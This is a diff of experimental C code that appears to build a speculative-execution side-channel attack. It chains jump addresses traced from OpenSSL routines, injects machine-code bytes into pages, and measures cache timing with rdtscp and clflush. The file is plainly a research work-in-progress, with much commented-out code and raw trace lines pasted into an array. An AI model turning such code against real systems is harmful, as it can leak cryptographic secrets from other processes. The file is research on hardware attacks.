@@ -59,7 +59,7 @@ typedef struct jump_st {
 
 #define PAGE_SIZE 0x1000
 #define MAX_PAGES 100
-#define NUM_JUMPS 31
+#define NUM_JUMPS 16
 
 
 inline void call(void *fn_ptr) __attribute__((always_inline));
@@ -76,9 +76,7 @@ void push(uint64_t val) {
 uint64_t loaded_pages[MAX_PAGES];
 int loaded_pages_idx = 0;
 jump jump_addrs[NUM_JUMPS] = {
-        // in openssl-accept.repeats2: 254 repeats (line 14491502):
-        // part of EC_GFp_nistp224_method()
-        {0x7ffff785a74b, 0x7ffff785c256}, //  retq   
+        /*
         {0x7ffff785a926, 0x7ffff785c261}, //  retq   
         {0x7ffff785ae37, 0x7ffff785c277}, //  retq   
         {0x7ffff785a74b, 0x7ffff785c28f}, //  retq   
@@ -109,6 +107,53 @@ jump jump_addrs[NUM_JUMPS] = {
         {0x7ffff785a5f0, 0x7ffff785c798}, //  retq   
         {0x7ffff785ae37, 0x7ffff785c847}, //  retq   
         {0x7ffff785c858, 0x7ffff785ea59}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785c22a}, //  retq   
+        */
+        // in openssl-accept.repeats2}, //254 repeats (line 14491502):
+        // part of EC_GFp_nistp224_method()
+        /*
+        {0x7ffff785a74b, 0x7ffff785c256}, //  retq   
+        {0x7ffff785a926, 0x7ffff785c261}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c277}, //  retq   
+
+        {0x7ffff785a74b, 0x7ffff785c28f}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785c2a2}, //  retq   
+        {0x7ffff785abfc, 0x7ffff785c2b5}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c2cd}, //  retq   
+
+        {0x7ffff785a34a, 0x7ffff785c2e3}, //  retq   
+        {0x7ffff785a27e, 0x7ffff785c2f3}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785ac1d}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785ac28}, //  retq   
+
+        {0x7ffff785abfc, 0x7ffff785ac36}, //  retq   
+        {0x7ffff785ac40, 0x7ffff785c3c5}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c3d0}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785c3e3}, //  retq   
+
+        */
+/*
+        {0x7ffff785a926, 0x7ffff785c3f3}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c3ff}, //  retq   
+        {0x7ffff785a34a, 0x7ffff785c4b7}, //  retq   
+        {0x7ffff785a27e, 0x7ffff785c4c9}, //  retq   
+
+        {0x7ffff785a27e, 0x7ffff785c538}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785c543}, //  retq   
+        {0x7ffff785a926, 0x7ffff785c54e}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c55e}, //  retq   
+
+        {0x7ffff785a34a, 0x7ffff785c569}, //  retq   
+        {0x7ffff785a41a, 0x7ffff785c61d}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785c628}, //  retq   
+        {0x7ffff785abfc, 0x7ffff785c638}, //  retq   
+
+        {0x7ffff785a926, 0x7ffff785c645}, //  retq   
+        {0x7ffff785a5f0, 0x7ffff785c798}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c847}, //  retq   
+        {0x7ffff785c858, 0x7ffff785ea59}, //  retq   
+        */
+        //*/
         /*
         // CAMELLIA256-SHA / EVP_MD_CTX_init...
         {0x7ffff780d32d, 0x7ffff780d3ff}, //  retq   
@@ -143,6 +188,47 @@ jump jump_addrs[NUM_JUMPS] = {
         {0x7ffff780d407, 0x7ffff789730b}, //  retq   
         {0x7ffff7897318, 0x7ffff788a420}, //  retq  
         //*/
+        
+        */
+
+        // ~50 repeats...
+        92217  0x7ffff7877a7d -> 0x7ffff788a070:   retq   
+        92239  0x7ffff7889fb2 -> 0x7ffff7891030:   jmpq   *%rax
+        92277  0x7ffff78063ea -> 0x7ffff78869fe:   retq   
+        92289  0x7ffff788a144 -> 0x7ffff7891020:   jmpq   *%rax
+        92327  0x7ffff77fdb40 -> 0x7ffff7470a30:   jmpq   *0x36e68a(%rip)        # 0x7ffff7b6c1d0
+        92343  0x7ffff7470a71 -> 0x7ffff7806113:   retq   
+        92350  0x7ffff7806120 -> 0x7ffff7886a28:   retq   
+        92357  0x7ffff788a144 -> 0x7ffff7891020:   jmpq   *%rax
+        92394  0x7ffff77fdb40 -> 0x7ffff7470a30:   jmpq   *0x36e68a(%rip)        # 0x7ffff7b6c1d0
+        92411  0x7ffff7470a71 -> 0x7ffff78061a7:   retq   
+        92420  0x7ffff7806120 -> 0x7ffff7886a3e:   retq   
+        92433  0x7ffff788a144 -> 0x7ffff7891020:   jmpq   *%rax
+        92470  0x7ffff77fdb40 -> 0x7ffff7470a30:   jmpq   *0x36e68a(%rip)        # 0x7ffff7b6c1d0
+        92487  0x7ffff7470a71 -> 0x7ffff78061a7:   retq   
+        92496  0x7ffff7806120 -> 0x7ffff7886c6a:   retq   
+        92515  0x7ffff788a16c -> 0x7ffff7891010:   callq  *0x28(%rax)
+
+
+        // 148 repeats
+        539442  0x7ffff783929d -> 0x7ffff783a390:   retq   
+        539478  0x7ffff7838bd2 -> 0x7ffff783a3e2:   retq   
+        539487  0x7ffff783a3f2 -> 0x7ffff783daab:   retq   
+        539544  0x7ffff783f728 -> 0x7ffff7834718:   retq   
+        539561  0x7ffff78347a3 -> 0x7ffff7834b15:   retq   
+        539568  0x7ffff7834b24 -> 0x7ffff783dac1:   retq   
+        539653  0x7ffff7838ab2 -> 0x7ffff7834d40:   retq   
+        539707  0x7ffff7838036 -> 0x7ffff7838c45:   retq   
+        539715  0x7ffff7838c56 -> 0x7ffff7834d48:   retq   
+        539770  0x7ffff7838036 -> 0x7ffff7838c45:   retq   
+        539778  0x7ffff7838c56 -> 0x7ffff7834d53:   retq   
+        539833  0x7ffff7838036 -> 0x7ffff7838c45:   retq   
+        539841  0x7ffff7838c56 -> 0x7ffff7834d5f:   retq   
+        539878  0x7ffff7837af1 -> 0x7ffff7837bd6:   retq   
+        539881  0x7ffff7837bd9 -> 0x7ffff7834da4:   retq   
+        540325  0x7ffff77fd9f0 -> 0x7ffff74628d0:   jmpq   *0x36e732(%rip)        # 0x7ffff7b6c128
+
+
     };
 
 
@@ -198,9 +284,11 @@ void check_probes() {
     uint64_t t0, t1;
     uint8_t *addr;
 
-    int i;
+    int i, mix_i;
     for (i=0; i<NUM_PROBES; i++) {
-        addr = &probe_buf[i*cur_probe_space];
+        //mix_i = ((i*13) + 7) & 15;
+        mix_i = i;
+        addr = &probe_buf[mix_i*cur_probe_space];
         t0 = _rdtscp(&junk);
         asm volatile( "movb (%%rbx), %%al\n"
             :: "b"(addr) : "rax");
@@ -208,7 +296,7 @@ void check_probes() {
         if (t1-t0 < 140) {
             cache_hits++;
             tot_time += t1-t0;
-            results[i]++;
+            results[mix_i]++;
             //printf("# %lu\n", t1-t0);
             //_mm_clflush(addr);
         }
@@ -222,7 +310,14 @@ void check_probes() {
     //usleep(100);
 }
 
+
+typedef void (*fn_ptr_t)(void);
+
 uint64_t jmp_ptr;
+fn_ptr_t *fn_ptr_ptr;   // This is a pointer that when dereferenced
+                    // will yield a void (*)(void) that points to check_probes.
+                    // Now we can move this around (malloc each time)
+
 
 
 
@@ -256,19 +351,76 @@ void indirect_camellia(register uint64_t *jmp_ptr) {
         asm volatile ("push %%rax\n" :: "a"(jump_addrs[i].to):);
     }
 
+    /*
+    asm volatile ("mov $2, %%rax\n"
+                "cmpb $0x02, %%al\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n" ::: "rax");
+                */
+
     // Do something slow to stall the pipeline???
     // Call the first thing in the jump chain
     //call((void (*)(void))jump_addrs[0].from);
-    asm volatile ("add (%%rcx), %%rax\n"
+    asm volatile (//"add (%%rcx), %%rax\n"
             "jmpq *%%rax\n" :: "a"(jump_addrs[0].from), "c"(jmp_ptr):);
+            //*/
 
+    //asm volatile ("jmpq *%%rax\n" :: "a"(jump_addrs[0].from):);
 
 done_jumps:
-    (*fn_ptr)();
+    asm volatile("nop\n":::);
+    //asm volatile ("add (%%rcx), %%rax\n" :: "c"(jmp_ptr));
+    //(*fn_ptr)();
+    //t0 = _rdtscp(&junk);
+    //fn_ptr = *fn_ptr_ptr;
+    //t1 = _rdtscp(&junk);
+    //printf("%d\n", t1-t0);
+    //(**fn_ptr_ptr)();
+    //(*(void(*)(void))(jump_addrs[NUM_JUMPS-1].to))();
 }
 
 
 void (*fn_ptr)(void);
+
 
 void measure() {
     fn_ptr = check_probes;
@@ -276,19 +428,22 @@ void measure() {
     jmp_ptr = 0;
     int i;
 
+
     int misses = 0;
     uint64_t last_i = 0xff;
 
     while (1) {
         for (i=0; i<15000; i++) {
+            _mm_clflush(fn_ptr);
             _mm_clflush(&fn_ptr);
             _mm_clflush(&jmp_ptr);
-            //indirect(&jmp_ptr);
+            /*
+            fn_ptr_ptr = malloc(sizeof(void*));
+            *fn_ptr_ptr = check_probes;
+            _mm_clflush(fn_ptr_ptr);
+            */
             indirect_camellia(&jmp_ptr);
-            //((void(*)(void *))map)(&jmp_ptr);
-            //if ((i % 3)==0) {
-                usleep(10);
-            //}
+            usleep(1);
         }
         uint64_t avg = 0;
         if (cache_hits > 0) avg = tot_time/cache_hits;
@@ -323,7 +478,11 @@ void measure() {
             }
 
         } else {
-             printf("--[%lu]: %lu, %lu avg cycles ps %ld\n", max_i, max_res, avg, cur_probe_space);
+            printf("--[%lu]: %lu, %lu avg cycles ps %ld, 13 had: %lu, %lu tot hits\n", max_i, max_res, avg, cur_probe_space, results[13], cache_hits);
+            /*
+            for (i=0; i<NUM_PROBES; i++) {
+                printf("  %d: %d\n", i, results[i]);
+            }*/
             misses++;
             cur_probe_space += 63;
             cur_probe_space %= MAX_PROBE_SPACE;
@@ -355,11 +514,19 @@ int main()
         _mm_clflush(&probe_buf[i*cur_probe_space]);
     }
 
-   // Setup of OpenSSL Camellia EVP_MD_CTX_init jumps
+    // Setup of OpenSSL Camellia EVP_MD_CTX_init jumps
+    uint64_t target = jump_addrs[NUM_JUMPS-1].to;
+    uint64_t min_diff = jump_addrs[0].to - target;
+
     memset(loaded_pages, 0, sizeof(uint64_t)*MAX_PAGES);
     for (i=0; i<NUM_JUMPS-1; i++) {
         load_page(jump_addrs[i].from);
         load_page(jump_addrs[i].to);
+
+        uint64_t target_diff = jump_addrs[i].to - target;
+        if (target_diff < min_diff) {
+            min_diff = target_diff;
+        }
 
         // Write the jump from this .to to  the next .from
         // get difference - 5 (len(jmpq $xxxx) instruction)
@@ -378,15 +545,32 @@ int main()
         }
     }
 
+    // The last .from should be filled with:
+    // 48 8b 04 25 00 00 44 00  mov (0x440000),%rax
+    // ff d0                    callq *%rax
+
+    uint8_t stalled_jmp[] = {
+                            0x90, 0x90,
+                            0x90,                               // nop
+            0x48, 0x8b, 0x04, 0x25, 0x00, 0x00, 0x44, 0x00,     // mov (0x440000),%rax
+                            //0x90, 0x90,                         // nop, nop
+                            //0x50,                               // push %rax
+                            0x90,
+                            0x90,
+                            //0xeb, 0x02,                          // jmp +2
+                            0x90, 0x90,                         // nop, no
+                            0xff, 0xd0,                         // callq *%rax
+                            //0xc3, 0x90,
+                            0x90};
+
+    memcpy((void*)jump_addrs[NUM_JUMPS-2].to, stalled_jmp, 20);
 
     load_page(jump_addrs[NUM_JUMPS-1].to);
-    printf("Copying 0x%x bytes to 0x%08x...\n", end_target_fn-target_fn,
-            (uint64_t)jump_addrs[NUM_JUMPS-1].to);
+    printf("Copying 0x%lx bytes to 0x%08lx...we have 0x%lx bytes of head space\n", end_target_fn-target_fn,
+            (uint64_t)jump_addrs[NUM_JUMPS-1].to, min_diff);
     // Copy the target_fn code into the last jump_addrs[NUM_JUMPS-1].to
     // This will hopefully be speculatively called...
     memcpy((void*)jump_addrs[NUM_JUMPS-1].to, target_fn, end_target_fn-target_fn);
-
-    printf("bye\n");
 
 
     /*
@@ -397,5 +581,5 @@ int main()
     */
     fn_ptr = check_probes;
     measure();
-
 }
+
